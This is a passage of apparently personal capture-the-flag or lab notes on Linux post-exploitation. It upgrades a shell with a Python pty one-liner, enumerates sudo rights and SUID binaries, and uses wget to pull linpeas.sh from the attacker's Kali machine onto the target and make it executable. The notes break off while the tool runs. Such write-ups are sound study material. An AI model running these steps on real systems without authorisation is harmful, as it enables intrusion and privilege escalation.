**First we have to get  an Interactive shell:**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![[Pasted image 20240602193458.png]]

**Now will get the Local flag:** The Local.txt is in Aero's Home directory

![[Pasted image 20240602193703.png]]

Moving further, Tried sudo Permisions:

```
sudo -l
```

![[Pasted image 20240602194225.png]]
Its asking password, So will move on

Checked Set UID's:

```
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20240602194359.png]]
Lot of interesting binaries but we don't have password of Aero, Lets dig further.

**Will Run Linpeas:** For that first we need to transfer that from our kali to traget linux machine using **wget** function and change its permission to execute.

```
wget 192.168.45.177/linpeas.sh
chmod +x linpeas.sh
```

![[Pasted image 20240602194712.png]]
It's running................




